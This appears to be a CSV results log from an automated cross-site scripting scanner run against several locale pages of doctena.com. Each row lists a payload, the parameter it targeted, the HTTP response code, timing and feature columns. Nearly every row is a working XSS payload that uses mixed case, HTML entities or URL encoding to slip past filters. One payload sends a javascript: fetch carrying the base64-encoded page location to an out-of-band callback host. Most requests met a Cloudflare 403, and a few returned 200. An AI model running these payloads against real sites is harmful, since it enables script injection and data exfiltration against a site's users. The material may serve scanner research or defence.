url,param,payload,server_type,method,response_code,response_time,response_pattern,success,content_snippet,vulnerable,injection_context,nlp_forms_found,nlp_inputs_count,nlp_scripts_found,nlp_has_eval_or_write,nlp_has_sanitization_patterns,nlp_reflected_location_type,fuzz_num_filtered,fuzz_num_encoded
https://www.doctena.com/de/,fs,%3Cscript%3Ealert%281%29%3C/script%3E,generic,GET,403,2.062509775161743,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-be/,fs,JaVAscRipT:FETcH('//65rPAVZPtmnD.OaST.PRo/Js?loC='+BToa(wIndoW.LOcATion)),generic,GET,403,2.101341485977173,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl/,add_woo_product_skus,"javascript:alert(""XSS"")",generic,GET,403,2.0534157752990723,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl/,fs,<Img SRC=X oNERroR=AlERt(1)>,generic,GET,403,2.046295166015625,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-nl/,s,%26%2334%3B%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E,generic,GET,403,2.078396797180176,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-nl/,post_type[],&#34;&#x3e;&#x3c;img src=x onerror=alert('XSS')&#x3e;,generic,GET,403,2.073578119277954,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-nl/,search_limit_to_post_titles,%3Ca%20foo%3Da%20href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick%20Me%3C/a%3E,generic,GET,403,2.0620155334472656,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-nl/,add_woo_product_skus,"&#x3c;BASE HREF=""javascript:alert('XSS');//""&#x3e;",generic,GET,403,2.064042806625366,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-nl/,fs,%3Cimg%20src%3D%22vbscript%3Aalert%28%27XSS%27%29%22%3E,generic,GET,403,2.063055992126465,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl-be/,s,"<div STyLE=""wiDTH: eXPrESsiOn(ALert('xSs'));"">",generic,GET,403,2.1218016147613525,"<html><head>
	<title>403 Forbidden</title>
	<style>
		html {
			font-family: ""Helvetica Neue"", Helve",0,"<html><head>
	<title>403 Forbidden</title>
	<style>
		html {
			font-family: ""Helvetica Neue"", Helve",0,generic,0,0,1,1,0,none,0,0
https://www.doctena.com/nl-be/,post_type[],<BODY ONLOAD=alert('XSS')>,generic,GET,403,2.055846929550171,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl-be/,search_limit_to_post_titles,"<A HREf=""JavaScRIPT:VoID(0)"" onmOuSEOVeR=""aLErT(1)"">CLICk Me</a>",generic,GET,403,2.0891568660736084,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-be/,s,%3Cimg%20src%3Dx%20onerror%3Dconfirm%28%22XSS%22%29%3E,generic,GET,403,2.107801675796509,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-be/,s,"&#x3c;img src=""x"" onerror=""alert('XSS')"" /&#x3e;",generic,GET,403,2.2087626457214355,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-ch/,s,"<img src=""x"" onerror=""alert('XSS')"" />",generic,GET,403,2.0924501419067383,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl-be/,add_woo_product_skus,"<TD BACKGROUND=""javascript:alert('XSS')"">",generic,GET,403,2.0982348918914795,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-be/,post_type[],"<iMg srC=""vbScRipT:alERt('xSs')"">",generic,GET,403,2.068962812423706,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-ch/,post_type[],&#34;><img src=x onerror=alert('XSS')>,generic,GET,403,2.1083061695098877,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/nl-be/,fs,%26%23x22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E,generic,GET,403,2.059872627258301,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-be/,search_limit_to_post_titles,%3Cimg%20src%3Dx%20onerror%3Dconfirm%28%22XSS%22%29%3E,generic,GET,403,2.0686111450195312,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-ch/,search_limit_to_post_titles,&#34;><img src=x onerror=al	ert(1)('XSS')>,generic,GET,403,2.0554752349853516,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-be/,add_woo_product_skus,"<iMG SrC=""X"" onERror=""AlERt('xsS')"" />",generic,GET,403,2.0627593994140625,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-be/,post_type[],&#34><img src=x on/**/error=alert('XSS')>,generic,GET,200,4.12342381477356,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,generic,1,7,1,0,0,none,0,0
https://www.doctena.com/fr-ch/,add_woo_product_skus,"<img foo=a src=""javascript:alert('XSS')"">",generic,GET,403,2.1086959838867188,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-be/,fs,"<img foo=a src=""javascript:alert('XSS')"">",generic,GET,403,2.098961591720581,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-ch/,s,&#34><img src=x on/**/error=alert('XSS')>,generic,GET,200,4.368199348449707,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,attribute,1,7,1,0,0,attribute,0,0
https://www.doctena.com/fr-ch/,live_min_character,"'; aLert(STriNG.frOMchArCodE(88,83,83))//'; alERt(strInG.FrOmchArCodE(88,83,83))//""; aLERt(StRing.FRoMChARCoDe(88,83,83))//""; alErT(STriNG.FrOMCharcode(88,83,83))//--></SCrIPt>"">'; aLERT(StRInG.fROMCHARcode(88,83,83))//'; alERt(STrING.FRoMchARCODE(88,83,83))//""; ALeRt(StrINg.fRoMcHarCOde(88,83,83))//""; aLERT(StRIng.fROmcHarCoDe(88,83,83))//--></scRIPt>",generic,GET,403,2.0539231300354004,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-ch/,post_type[],"&#x3c;img onmouseover=""alert('XSS')"" src=""x""&#x3e;",generic,GET,403,2.085280656814575,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-ch/,live_posts_per_page,%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%27%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//%22%3B%20alert%28String.fromCharCode%2888%2C83%2C83%29%29//--%3E%3C/SCRIPT%3E,generic,GET,403,2.0496668815612793,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-ch/,live_search_display_featured_image,<scri pt>alert(1)</script>,generic,GET,403,2.045154333114624,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-be/,search_limit_to_post_titles,%3Cimg%3E,generic,GET,200,3.291689872741699,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,generic,1,7,1,0,0,none,0,0
https://www.doctena.com/fr-ch/,live_search_display_post_type,"&#x3c;style&#x3e;li {list-style-image: url(""javascript:alert('XSS')"");}&#x3c;/style&#x3e;&#x3c;ul&#x3e;&#x3c;li&#x3e;&#x3c;/ul&#x3e;",generic,GET,403,2.102536678314209,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-be/,add_woo_product_skus,"<a href=""javascript:void(0)"" onmouseover=""alert(1)"">Click Me</a>",generic,GET,403,2.095456123352051,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-ch/,fs,%3Cimg%20src%3D%22vbscript%3Aalert%28%27XSS%27%29%22%3E,generic,GET,403,2.0453896522521973,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-ch/,search_limit_to_post_titles,"&#x3c;img src=""http://example.com/image.jpg""&#x3e;",generic,GET,200,4.972565412521362,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,"<html class=""avada-html-layout-wide avada-html-header-position-top avada-is-100-percent-template ua-",0,generic,1,7,1,0,0,none,0,0
https://www.doctena.com/de-be/,live_min_character,<BODY ONLOAD=alert('XSS')>,generic,GET,403,2.0779459476470947,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-ch/,add_woo_product_skus,%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E,generic,GET,403,2.070765495300293,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-be/,live_posts_per_page,"<img foo=a onerror=""al	ert(1)('XSS')"">",generic,GET,403,2.0812933444976807,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/fr-ch/,fs,"&#x3c;TABLE&#x3e;&#x3c;TD BACKGROUND=""javascript:alert('XSS')""&#x3e;",generic,GET,403,2.063439130783081,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-be/,live_search_display_featured_image,%3Cimg%20src%3Dx%20onerror%3Deval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%3E,generic,GET,403,2.07733416557312,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-be/,live_search_display_post_type,<sVG><P><sTyle><ImG sRC=1 HRef=1 oNeRrOr=aLerT(1)></P></Svg>,generic,GET,403,2.0651464462280273,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/de-be/,fs,"<sWf><PARaM NAmE=MovIe valuE=""JavAScRipt:alERT('xSs')""></paRaM><emBED sRc=""JaVaSCRipt:alerT('XSS')""></EMBed></sWf>",generic,GET,403,2.0708718299865723,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
https://www.doctena.com/en-nl/,s,&#x3c;svg&#x3e;&#x3c;p&#x3e;&#x3c;style&#x3e;&#x3c;img src=1 href=1 onerror=alert(1)&#x3e;&#x3c;/p&#x3e;&#x3c;/svg&#x3e;,generic,GET,403,2.0901219844818115,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,"<html class=""no-js"" lang=""en-US""><!--<![endif]--><head>
<title>Attention Required! | Cloudflare</tit",0,generic,0,0,1,0,0,none,0,0
